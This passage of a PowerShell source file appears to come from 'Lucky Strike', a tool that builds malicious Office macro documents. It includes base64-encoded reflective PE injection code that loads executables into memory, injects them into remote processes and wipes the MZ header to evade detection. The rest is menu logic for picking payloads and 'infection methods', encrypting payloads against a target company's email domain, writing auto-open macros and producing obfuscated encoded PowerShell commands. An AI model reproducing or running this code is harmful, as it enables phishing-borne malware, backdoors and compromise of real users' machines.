RlbGVnYXRlKQoJCQoJCSREbGxNYWluLkludm9rZSgkUEVJbmZvLlBFSGFuZGxlLCAwLCBbSW50UHRyXTo6WmVybykgfCBPdXQtTnVsbAoJCQoJCQoJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlLkludm9rZSgkUEVIYW5kbGUsIFtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKQoJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQoJCXsKCQkJV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIGNhbGwgVmlydHVhbEZyZWUgb24gdGhlIFBFJ3MgbWVtb3J5LiBDb250aW51aW5nIGFueXdheXMuIiAtV2FybmluZ0FjdGlvbiBDb250aW51ZQoJCX0KCX0KCgoJRnVuY3Rpb24gTWFpbgoJewoJCSRXaW4zMkZ1bmN0aW9ucyA9IEdldC1XaW4zMkZ1bmN0aW9ucwoJCSRXaW4zMlR5cGVzID0gR2V0LVdpbjMyVHlwZXMKCQkkV2luMzJDb25zdGFudHMgPSAgR2V0LVdpbjMyQ29uc3RhbnRzCgkJCgkJJFJlbW90ZVByb2NIYW5kbGUgPSBbSW50UHRyXTo6WmVybwoJCgkJI0lmIGEgcmVtb3RlIHByb2Nlc3MgdG8gaW5qZWN0IGluIHRvIGlzIHNwZWNpZmllZCwgZ2V0IGEgaGFuZGxlIHRvIGl0CgkJaWYgKCgkUHJvY0lkIC1uZSAkbnVsbCkgLWFuZCAoJFByb2NJZCAtbmUgMCkgLWFuZCAoJFByb2NOYW1lIC1uZSAkbnVsbCkgLWFuZCAoJFByb2NOYW1lIC1uZSAiIikpCgkJewoJCQlUaHJvdyAiQ2FuJ3Qgc3VwcGx5IGEgUHJvY0lkIGFuZCBQcm9jTmFtZSwgY2hvb3NlIG9uZSBvciB0aGUgb3RoZXIiCgkJfQoJCWVsc2VpZiAoJFByb2NOYW1lIC1uZSAkbnVsbCAtYW5kICRQcm9jTmFtZSAtbmUgIiIpCgkJewoJCQkkUHJvY2Vzc2VzID0gQChHZXQtUHJvY2VzcyAtTmFtZSAkUHJvY05hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpCgkJCWlmICgkUHJvY2Vzc2VzLkNvdW50IC1lcSAwKQoJCQl7CgkJCQlUaHJvdyAiQ2FuJ3QgZmluZCBwcm9jZXNzICRQcm9jTmFtZSIKCQkJfQoJCQllbHNlaWYgKCRQcm9jZXNzZXMuQ291bnQgLWd0IDEpCgkJCXsKCQkJCSRQcm9jSW5mbyA9IEdldC1Qcm9jZXNzIHwgd2hlcmUgeyAkXy5OYW1lIC1lcSAkUHJvY05hbWUgfSB8IFNlbGVjdC1PYmplY3QgUHJvY2Vzc05hbWUsIElkLCBTZXNzaW9uSWQKCQkJCVdyaXRlLU91dHB1dCAkUHJvY0luZm8KCQkJCVRocm93ICJNb3JlIHRoYW4gb25lIGluc3RhbmNlIG9mICRQcm9jTmFtZSBmb3VuZCwgcGxlYXNlIHNwZWNpZnkgdGhlIHByb2Nlc3MgSUQgdG8gaW5qZWN0IGluIHRvLiIKCQkJfQoJCQllbHNlCgkJCXsKCQkJCSRQcm9jSWQgPSAkUHJvY2Vzc2VzWzBdLklECgkJCX0KCQl9CgkJCgkJI0p1c3QgcmVhbGl6ZWQgdGhhdCBQb3dlclNoZWxsIGxhdW5jaGVzIHdpdGggU2VEZWJ1Z1ByaXZpbGVnZSBmb3Igc29tZSByZWFzb24uLiBTbyB0aGlzIGlzbid0IG5lZWRlZC4gS2VlcGluZyBpdCBhcm91bmQganVzdCBpbmNhc2UgaXQgaXMgbmVlZGVkIGluIHRoZSBmdXR1cmUu",
		"CgkJI0lmIHRoZSBzY3JpcHQgaXNuJ3QgcnVubmluZyBpbiB0aGUgc2FtZSBXaW5kb3dzIGxvZ29uIHNlc3Npb24gYXMgdGhlIHRhcmdldCwgZ2V0IFNlRGVidWdQcml2aWxlZ2UKIwkJaWYgKChHZXQtUHJvY2VzcyAtSWQgJFBJRCkuU2Vzc2lvbklkIC1uZSAoR2V0LVByb2Nlc3MgLUlkICRQcm9jSWQpLlNlc3Npb25JZCkKIwkJewojCQkJV3JpdGUtVmVyYm9zZSAiR2V0dGluZyBTZURlYnVnUHJpdmlsZWdlIgojCQkJRW5hYmxlLVNlRGVidWdQcml2aWxlZ2UgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCiMJCX0JCgkJCgkJaWYgKCgkUHJvY0lkIC1uZSAkbnVsbCkgLWFuZCAoJFByb2NJZCAtbmUgMCkpCgkJewoJCQkkUmVtb3RlUHJvY0hhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5PcGVuUHJvY2Vzcy5JbnZva2UoMHgwMDFGMEZGRiwgJGZhbHNlLCAkUHJvY0lkKQoJCQlpZiAoJFJlbW90ZVByb2NIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQl7CgkJCQlUaHJvdyAiQ291bGRuJ3Qgb2J0YWluIHRoZSBoYW5kbGUgZm9yIHByb2Nlc3MgSUQ6ICRQcm9jSWQiCgkJCX0KCQkJCgkJCVdyaXRlLVZlcmJvc2UgIkdvdCB0aGUgaGFuZGxlIGZvciB0aGUgcmVtb3RlIHByb2Nlc3MgdG8gaW5qZWN0IGluIHRvIgoJCX0KCQkKCgkJI0xvYWQgdGhlIFBFIHJlZmxlY3RpdmVseQoJCVdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IgoJCSRQRUhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCgkJaWYgKCRSZW1vdGVQcm9jSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCSRQRUxvYWRlZEluZm8gPSBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkgLVBFQnl0ZXMgJFBFQnl0ZXMgLUV4ZUFyZ3MgJEV4ZUFyZ3MgLUZvcmNlQVNMUiAkRm9yY2VBU0xSCgkJfQoJCWVsc2UKCQl7CgkJCSRQRUxvYWRlZEluZm8gPSBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkgLVBFQnl0ZXMgJFBFQnl0ZXMgLUV4ZUFyZ3MgJEV4ZUFyZ3MgLVJlbW90ZVByb2NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLUZvcmNlQVNMUiAkRm9yY2VBU0xSCgkJfQoJCWlmICgkUEVMb2FkZWRJbmZvIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCVRocm93ICJVbmFibGUgdG8gbG9hZCBQRSwgaGFuZGxlIHJldHVybmVkIGlzIE5VTEwiCgkJfQoJCQoJCSRQRUhhbmRsZSA9ICRQRUxvYWRlZEluZm9bMF0KCQkkUmVtb3RlUEVIYW5kbGUgPSAkUEVMb2FkZWRJbmZvWzFdICNvbmx5IG1hdHRlcnMgaWYgeW91IGxvYWRlZCBpbiB0byBhIHJlbW90ZSBwcm9jZXNzCgkJCgkJCgkJI0NoZWNrIGlmIEVYRSBvciBETEwuIElmIEVYRSwgdGhlIGVudHJ5IHBvaW50IHdhcyBhbHJlYWR5IGNhbGxlZCBhbmQgd2UgY2FuIG5vdyByZXR1cm4uIElmIERMTCwgY2FsbCB1c2VyIGZ1bmN0aW9uLgoJCSRQRUluZm8gPSBHZXQtUEVEZXRhaWxlZEluZm8gLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCgkJaWYgKCgkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpIC1hbmQgKCRSZW1vdGVQcm9jSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykpCgkJewoJCQkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJCQkjIyMgWU9VUiBDT0RFIEdPRVMgSEVSRQoJCQkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJICAgICAgICBzd2l0Y2ggKCRGdW5jUmV0dXJuVHlwZSkKCSAgICAgICAgewoJICAgICAgICAgICAgJ1dTdHJpbmcnIHsKCSAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDYWxsaW5nIGZ1bmN0aW9uIHdpdGggV1N0cmluZyByZXR1cm4gdHlwZSIKCQkJCSAgICBbSW50UHRyXSRXU3RyaW5nRnVuY0FkZHIgPSBHZXQtTWVtb3J5UHJvY0FkZHJlc3MgLVBFSGFuZGxlICRQRUhhbmRsZSAtRnVuY3Rpb25OYW1lICJXU3RyaW5nRnVuYyIKCQkJCSAgICBpZiAoJFdTdHJpbmdGdW5jQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJCQkgICAgewoJCQkJCSAgICBUaHJvdyAiQ291bGRuJ3QgZmluZCBmdW5jdGlvbiBhZGRyZXNzLiIKCQkJCSAgICB9CgkJCQkgICAgJFdTdHJpbmdGdW5jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0ludFB0cl0pCgkJCQkgICAgJFdTdHJpbmdGdW5jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdTdHJpbmdGdW5jQWRkciwgJFdTdHJpbmdGdW5jRGVsZWdhdGUpCgkJCQkgICAgW0ludFB0cl0kT3V0cHV0UHRyID0gJFdTdHJpbmdGdW5jLkludm9rZSgpCgkJCQkgICAgJE91dHB1dCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nVW5pKCRPdXRwdXRQdHIpCgkJCQkgICAgV3JpdGUtT3V0cHV0ICRPdXRwdXQKCSAgICAgICAgICAgIH0KCgkgICAgICAgICAgICAnU3RyaW5nJyB7CgkgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBmdW5jdGlvbiB3aXRoIFN0cmluZyByZXR1cm4gdHlwZSIKCQkJCSAgICBbSW50UHRyXSRTdHJpbmdGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlN0cmluZ0Z1bmMiCgkJCQkgICAgaWYgKCRTdHJpbmdGdW5jQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJCQkgICAgewoJCQkJCSAgICBUaHJvdyAiQ291bGRuJ3QgZmluZCBmdW5jdGlvbiBhZGRyZXNzLiIKCQkJCSAgICB9CgkJCQkgICAgJFN0cmluZ0Z1bmNEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQCgpIChbSW50UHRyXSkKCQkJCSAgICAkU3RyaW5nRnVuYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRTdHJpbmdGdW5jQWRkciwgJFN0cmluZ0Z1bmNEZWxlZ2F0ZSkKCQkJCSAgICBbSW50UHRyXSRPdXRwdXRQdHIgPSAkU3RyaW5nRnVuYy5JbnZva2UoKQoJCQkJICAgICRPdXRwdXQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJE91dHB1dFB0cikKCQkJCSAgICBXcml0ZS1PdXRwdXQgJE91dHB1dAoJICAgICAgICAgICAgfQoKCSAgICAgICAgICAgICdWb2lkJyB7CgkgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBmdW5jdGlvbiB3aXRoIFZvaWQgcmV0dXJuIHR5cGUiCgkJCQkgICAgW0ludFB0cl0kVm9pZEZ1bmNBZGRyID0gR2V0LU1lbW9yeVByb2NBZGRyZXNzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLUZ1bmN0aW9uTmFtZSAiVm9pZEZ1bmMiCgkJCQkgICAgaWYgKCRWb2lkRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQkJICAgIHsKCQkJCQkgICAgVGhyb3cgIkNvdWxkbid0IGZpbmQgZnVuY3Rpb24gYWRkcmVzcy4iCgkJCQkgICAgfQoJCQkJICAgICRWb2lkRnVuY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtWb2lkXSkKCQkJCSAgICAkVm9pZEZ1bmMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVm9pZEZ1bmNBZGRyLCAkVm9pZEZ1bmNEZWxlZ2F0ZSkKCQkJCSAgICAkVm9pZEZ1bmMuSW52b2tlKCkgfCBPdXQtTnVsbAoJICAgICAgICAgICAgfQoJICAgICAgICB9CgkJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkJCSMjIyBFTkQgT0YgWU9VUiBDT0RFCgkJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkJfQoJCSNGb3IgcmVtb3RlIERMTCBpbmplY3Rpb24sIGNhbGwgYSB2b2lkIGZ1bmN0aW9uIHdoaWNoIHRha2VzIG5vIHBhcmFtZXRlcnMKCQllbHNlaWYgKCgkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpIC1hbmQgKCRSZW1vdGVQcm9jSGFuZGxlIC1uZSBbSW50UHRyXTo6WmVybykpCgkJewoJCQkkVm9pZEZ1bmNBZGRyID0gR2V0LU1lbW9yeVByb2NBZGRyZXNzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLUZ1bmN0aW9uTmFtZSAiVm9pZEZ1bmMiCgkJCWlmICgoJFZvaWRGdW5jQWRkciAtZXEgJG51bGwpIC1vciAoJFZvaWRGdW5jQWRkciAtZXEgW0ludFB0cl06Olplcm8pKQoJCQl7CgkJCQlUaHJvdyAiVm9pZEZ1bmMgY291bGRuJ3QgYmUgZm91bmQgaW4gdGhlIERMTCIKCQkJfQoJCQkKCQkJJFZvaWRGdW5jQWRkciA9IFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkICRWb2lkRnVuY0FkZHIgJFBFSGFuZGxlCgkJCSRWb2lkRnVuY0FkZHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkVm9pZEZ1bmNBZGRyICRSZW1vdGVQRUhhbmRsZQoJCQkKCQkJI0NyZWF0ZSB0aGUgcmVtb3RlIHRocmVhZCwgZG9uJ3Qgd2FpdCBmb3IgaXQgdG8gcmV0dXJuLi4gVGhpcyB3aWxsIHByb2JhYmx5IG1haW5seSBiZSB1c2VkIHRvIHBsYW50IGJhY2tkb29ycwoJCQkkUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkVm9pZEZ1bmNBZGRyIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMKCQl9CgkJCgkJI0Rvbid0IGZyZWUgYSBsaWJyYXJ5IGlmIGl0IGlzIGluamVjdGVkIGluIGEgcmVtb3RlIHByb2Nlc3Mgb3IgaWYgaXQgaXMgYW4gRVhFLgogICAgICAgICNOb3RlIHRoYXQgYWxsIERMTCdzIGxvYWRlZCBieSB0aGUgRVhFIHdpbGwgcmVtYWluIGxvYWRlZCBpbiBtZW1vcnkuCgkJaWYgKCRSZW1vdGVQcm9jSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybyAtYW5kICRQRUluZm8uRmlsZVR5cGUgLWllcSAiRExMIikKCQl7CgkJCUludm9rZS1NZW1vcnlGcmVlTGlicmFyeSAtUEVIYW5kbGUgJFBFSGFuZGxlCgkJfQoJCWVsc2UKCQl7CgkJCSNEZWxldGUgdGhlIFBFIGZpbGUgZnJvbSBtZW1vcnkuCgkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlLkludm9rZSgkUEVIYW5kbGUsIFtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKQoJCQlpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKCQkJewoJCQkJV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIGNhbGwgVmlydHVhbEZyZWUgb24gdGhlIFBFJ3MgbWVtb3J5LiBDb250aW51aW5nIGFueXdheXMuIiAtV2FybmluZ0FjdGlvbiBDb250aW51ZQoJCQl9CgkJfQoJCQoJCVdyaXRlLVZlcmJvc2UgIkRvbmUhIgoJfQoKCU1haW4KfQoKI01haW4gZnVuY3Rpb24gdG8gZWl0aGVyIHJ1biB0aGUgc2NyaXB0IGxvY2FsbHkgb3IgcmVtb3RlbHkKRnVuY3Rpb24gTWFpbgp7CglpZiAoKCRQU0NtZGxldC5NeUludm9jYXRpb24uQm91bmRQYXJhbWV0ZXJzWyJEZWJ1ZyJdIC1uZSAkbnVsbCkgLWFuZCAkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1siRGVidWciXS5Jc1ByZXNlbnQpCgl7CgkJJERlYnVnUHJlZmVyZW5jZSAgPSAiQ29udGludWUiCgl9CgkKCVdyaXRlLVZlcmJvc2UgIlBvd2VyU2hlbGwgUHJvY2Vzc0lEOiAkUElEIgoJCgkjVmVyaWZ5IHRoZSBpbWFnZSBpcyBhIHZhbGlkIFBFIGZpbGUKCSRlX21hZ2ljID0gKCRQRUJ5dGVzWzAuLjFdIHwgJSB7W0NoYXJdICRffSkgLWpvaW4gJycKCiAgICBpZiAoJGVfbWFnaWMgLW5lICdNWicpCiAgICB7CiAgICAgICAgdGhyb3cgJ1BFIGlzIG5vdCBhIHZhbGlkIFBFIGZpbGUuJwogICAgfQoKCWlmICgtbm90ICREb05vdFplcm9NWikgewoJCSMgUmVtb3ZlICdNWicgZnJvbSB0aGUgUEUgZmlsZSBzbyB0aGF0IGl0IGNhbm5vdCBiZSBkZXRlY3RlZCBieSAuaW1nc2NhbiBpbiBXaW5EYmcKCQkjIFRPRE86IEludmVzdGlnYXRlIGhvdyBtdWNoIG9mIHRoZSBoZWFkZXIgY2FuIGJlIGRlc3Ryb3llZCwgSSdkIGltYWdpbmUgbW9zdCBvZiBpdCBjYW4gYmUuCgkJJFBFQnl0ZXNbMF0gPSAwCgkJJFBFQnl0ZXNbMV0gPSAwCgl9CgkKCSNBZGQgYSAicHJvZ3JhbSBuYW1lIiB0byBleGVhcmdzLCBqdXN0IHNvIHRoZSBzdHJpbmcgbG9va3MgYXMgbm9ybWFsIGFzIHBvc3NpYmxlIChyZWFsIGFyZ3Mgc3RhcnQgaW5kZXhpbmcgYXQgMSkKCWlmICgkRXhlQXJncyAt",
		"bmUgJG51bGwgLWFuZCAkRXhlQXJncyAtbmUgJycpCgl7CgkJJEV4ZUFyZ3MgPSAiUmVmbGVjdGl2ZUV4ZSAkRXhlQXJncyIKCX0KCWVsc2UKCXsKCQkkRXhlQXJncyA9ICJSZWZsZWN0aXZlRXhlIgoJfQoKCWlmICgkQ29tcHV0ZXJOYW1lIC1lcSAkbnVsbCAtb3IgJENvbXB1dGVyTmFtZSAtaW1hdGNoICJeXHMqJCIpCgl7CgkJSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRSZW1vdGVTY3JpcHRCbG9jayAtQXJndW1lbnRMaXN0IEAoJFBFQnl0ZXMsICRGdW5jUmV0dXJuVHlwZSwgJFByb2NJZCwgJFByb2NOYW1lLCRGb3JjZUFTTFIpCgl9CgllbHNlCgl7CgkJSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRSZW1vdGVTY3JpcHRCbG9jayAtQXJndW1lbnRMaXN0IEAoJFBFQnl0ZXMsICRGdW5jUmV0dXJuVHlwZSwgJFByb2NJZCwgJFByb2NOYW1lLCRGb3JjZUFTTFIpIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQoJfQp9CgpNYWluCn0="
	)
}

#endregion

#region Payload Methods

function Select-Payload()
{
	#$availablepayloads = Get-AvailablePayloads
	$selectedpayloads = Get-SelectedPayloads
	$allpayloads = Get-AllPayloads
	if (($allpayloads | measure).Count -eq 0)
	{
		Write-Message "There are no payloads in the catalog. Please add a payload to the catalog." "warning" $true
		Load-Menu 'catalog'
	}
	else
	{
		if ($script:doctype -eq $null)
		{
			$doctypes = Get-DocTypes
			Write-Message "`nPlease select the document type you wish to make:`n"
			foreach ($t in $doctypes)
			{
				Write-Message "`t$($t.ListID))  $($t.Name)"
			}
			Write-Message "`n"
			Do 
			{
				$dtselection = Read-Host -Prompt "Select"
			} 
			until ($dtselection -as [int] -and ($doctypes | ?{$_.ListID -eq $dtselection} | measure).count -gt 0)

			$dt = $doctypes | ?{$_.ListID -eq [int]$dtselection}
			$script:doctype = $dt.ID
			Write-Message "SELECT-PAYLOAD: DOCTYPEID: $($dt.ID)" "debug" -prependNewLine $true
		}

		$allpayloads = Get-PayloadsByDocType $script:doctype

		Write-Message "`n=========== Select Payload =============`n"
		foreach ($p in $allpayloads | sort ID)
		{	
			Write-Message "`t$($p.ListID))  $($p.Name)"
		}
		Write-Message "`t$exitnum) Done."
		Write-Message "`n"

		Do
		{ 
			$payloadselection = Read-Host -Prompt "Select" 
		}
		until ($payloadselection -as [int] -and (($allpayloads | ?{$_.ListID -eq $payloadselection} | measure).Count -gt 0 -or $payloadselection -eq $exitnum))
		
		Write-Message "SELECT-PAYLOAD: PAYLOADSELECTION: $payloadselection" "debug" -prependNewLine $true

		if ($payloadselection -eq $exitnum)
		{ 
			Load-Menu $script:currentmenu 
		}
		else
		{
			$payload = $allpayloads | ?{[int]$_.ListID -eq [int]$payloadselection}
			$p = Get-PayloadByID $payload.ID
			$it = Get-PayloadTypeInfectionTypes $p.PayloadType $script:doctype
			Write-Message "`n======== Choose Infection Method =======`n"
			foreach ($i in $it | sort ID)
			{	
				Write-Message "`t$($i.ListID))  $($i.Name)"
			}
			Write-Message "`t98) Help"
			Write-Message "`n"

			Do
			{ 
				$itselection = Read-Host -Prompt "Select"
				if ([int]$itselection -eq 98)
				{
					$it | fl
				}
			}
			until ($itselection -as [int] -and ($itselection -ge ($it.ListID | measure -Minimum).Minimum -and $itselection -le ($it.ListID | measure -Maximum).Maximum))

			Write-Message "SELECT-PAYLOAD: ITSELECTION: $itselection" "debug" -prependNewLine $true

			$selectedit = ($it | ?{[int]$_.ListId -eq [int]$itselection}).ID
			# Check for encryption
			switch ([int]$selectedit)
			{
				4 { # Cellembed-Encrypted
					$key = Read-Host -Prompt "Enter target company email domain name (e.g. company.com)"
					$encpayload = Crypt $p.PayloadText $key
					$numblocks = Get-NumBlocks $encpayload
					Add-ActiveWorking $payload.ID $selectedit $numblocks $encpayload
				}
				7 { # Run exe in memory. Requires Invoke-ReflectivePEInjection
					$is64bit = Read-Host -Prompt "Is the exe 64bit? (Y|N)"
					while (($is64bit -match "[YyNn]") -eq $false)
					{
						$is64Bit = Read-Host "This is a binary situation. Y or N please."
					}

					Write-Message "SELECT-PAYLOAD: IS64BIT: $is64Bit" "debug" -prependNewLine $true

					if ($is64bit -match "[Yy]")
					{
						$customstrings += "|SYSTYPE|,System32"
					}
					else 
					{	
						$customstrings += "|SYSTYPE|,syswow64"
					}

					# Add special record for IRPEI (47734) as well as main activeworking record.
					Add-ActiveWorking 47734 $selectedit 23 
					Write-message "Added IRPEI ActiveWorking Record" "debug"
					Write-Message "Adding payload. This attack is cool but finicky. Be sure to thoroughly test & make sure you have your architecture right!" "warning" $true

					Add-ActiveWorking $payload.ID $selectedit $p.NumBlocks -customstrings $customstrings
				}
				8 { # Metadata attack
					$active = Get-ActiveWorking
					if (($active | ?{$_.InfectionType -eq 8} | measure).Count -gt 0)
					{
						Write-Message "Unfortunately, you can only include one metadata payload at a time. Hoping to have this corrected soon. Please choose a different payload / infection type.`n" "warning" $true
						Load-Menu 'payload'
					}
					else
					{
						Add-ActiveWorking $payload.ID $selectedit $p.NumBlocks
					}
				}
				default {
					Add-ActiveWorking $payload.ID $selectedit $p.NumBlocks
				}
			}
			
			Write-Message "Payload added!" "success" $true
			Select-Payload
		}
	}
}

function Unselect-Payload()
{
	$active = Get-ActiveWorking
	if (($active | measure).Count -lt 1)
	{
		Write-Message "No payloads are currently selected" -prependNewLine $true
		Load-Menu 'payload'
	}
	else
	{
		Write-Message "`n=========== Remove Payload =============`n"
		foreach ($p in $active)
		{
			$payload = Get-PayloadByID $p.PayloadID
			$it = Get-InfectionTypeByID $p.InfectionType
			Write-Message "`t$($p.ListID)) $($payload.Name) ($($it.Name))"
		}
		Write-Message "`t$exitnum) Back"

		Do
		{ 
			$selection = Read-Host -Prompt "`nSelect" 
		}
		until (($active | ?{$_.ListID -eq $selection} | measure).Count -gt 0 -or $selection -eq $exitnum)
		
		Write-Message "REMOVE-PAYLOAD: SELECTION: $selection" "debug" -prependNewLine $true

		$currentitem = $active | ?{ $_.ListID -eq $selection }

		if (($currentitem | measure).Count -gt 0)
		{
			Remove-ActiveWorking $currentitem.PayloadID
			Write-Message "Payload removed." "success" $true
			if ((($active | measure).Count - 1) -lt 1) #Account for the payload we just removed.
			{
				Write-Message "All payloads removed. Select a payload to continue." "warning"
				Load-Menu 'payload'
			}
			else
			{ 
				Unselect-Payload 
			}
		}
		elseif ($selection -eq $exitnum)
		{ 
			Load-PreviousMenu 
		}
		else
		{ 
			Write-Message "That payload was not found. Choose carefully." "warning" 
		}
	}
}

function List-SelectedPayloads()
{
	$selected = Get-SelectedPayloads
	if (($selected | measure).Count -gt 0)
	{
		if ($PSBoundParameters['Debug'])
		{
			$selected | ft -Property Name, TargetIP, TargetPort, PayloadType, NumBlocks, PayloadText
		}
		else
		{
			$selected | ft -Property Name, TargetIP, TargetPort, PayloadType
		}
	}
	else
	{ 
		Write-Message "No payloads have been selected." -prependNewLine $true
	}
	Load-Menu $script:currentmenu
}

function Write-MacroText()
{
	$active = Get-ActiveWorking
	if (($active | measure).Count -gt 0)
	{
		$path = "$($PWD.Path)\macro_payload.txt"
		Generate-Macro -insertautoopen $true -includedeclares $true -doctype $script:doctype  | Out-File $path
		Write-Message "Macro code written to $path" "success"
	}
	else
	{ 
		Write-Message "You must add one or more payloads first." "error" 
	}
	Load-Menu $script:currentmenu
}

function Create-EncodedCommand()
{
	Write-Message "`n============== Encoder =============="
	$selection = Read-Host -Prompt "`nEnter PS Command: "
	Write-Message "CREATE-ENCODEDCOMMAND: SELECTION: $selection" "debug" -prependNewLine $true
	$Bytes = [System.Text.Encoding]::Unicode.GetBytes($selection)
	$EncodedText =[Convert]::ToBase64String($Bytes)
	$command = "powershell -W 1 -C `"powershell ([char]45+[char]101+[char]110+[char]99) $EncodedText`"" #Thanks @HackingDave!
	Write-Message "`n$command"
	$command | clip
	Write-Message "Command saved to clipboard.`n" "success" $true
	Load-Menu $script:currentmenu
}

#endregion

#region Menu Methods

function Show-Logo()
{
	$logo = @"
	
    __               __            _____ __       _ __      
   / /   __  _______/ /____  __   / ___// /______(_) /_____ 
  / /   / / / / ___/ //_/ / / /   \__ \/ __/ ___/ / //_/ _ \
 / /___/ /_/ / /__/ ,< / /_/ /   ___/ / /_/ /  / / ,< /  __/
/_____/\__,_/\___/_/|_|\__, /   /____/\__/_/  /_/_/|_|\___/ 
                      /____/                                

		ALL YOUR PAIN IN ONE MACRO.

		  $version - @curi0usJack
		
"@ 

	if (!$API) 
	{
		Write-Message $logo
	}
}

function Get-Menus()
{
$menus = @{

	'main' = @"

============= Main Menu ================

	1)  Payload Options
	2)  Catalog Options
	3)  File Options
	4)  Encode a PowerShell Command
	99) Exit

"@;

	'payload' = @"

=========== Payload Options ============

	1)  Select a payload
	2)  Unselect a payload 
	3)  Show selected payloads
	99) Back

"@;

	'catalog' = @"

=========== Catalog Options ============

  PAYLOADS: 
	1) Add payload to catalog
	2) Remove payload from catalog
	3) Show catalog payloads

  TEMPLATES:
	4) Add template to catalog
	5) Remove template from catalog
	6) Show catalog templates

	99) Back

"@;

	'file' = @"

=========== File Options ===============

	1)  Generate new file
	2)  Update existing file
	3)  Generate from template
	4)  Write existing macro code to file
	99) Back

"@

}

return $menus
}

function Load-PreviousMenu()
{
	if ($script:previousmenus.Length -lt 2)
		{ $previousmenu = "main" }
	else
		{ $previousmenu = $script:previousmenus[-2] }
		
	$script:currentmenu = $previousmenu
	$script:previousmenus.Remove($script:previousmenus[-1])
	Load-Menu $previousmenu
}

function Invalid-Option() 
{
	Write-Message "Invalid option. Try again." "error" $true
	Write-Message $script:menus[$currentmenu]
	$selection = Read-Host -Prompt "`nSelect"
	Process-MenuOption $selection
}

function Process-MenuOption($selection)
{
	Write-Message "PROCESS-MENUOPTIONS: SELECTION: $selection" "debug" -prependNewLine $true
	switch ($script:currentmenu)
	{
		'main'		{
			switch ($selection)
			{
				1		{ Load-Menu "payload" }
				2		{ Load-Menu "catalog" }
				3 		{ Load-Menu "file" }
				4		{ Create-EncodedCommand }
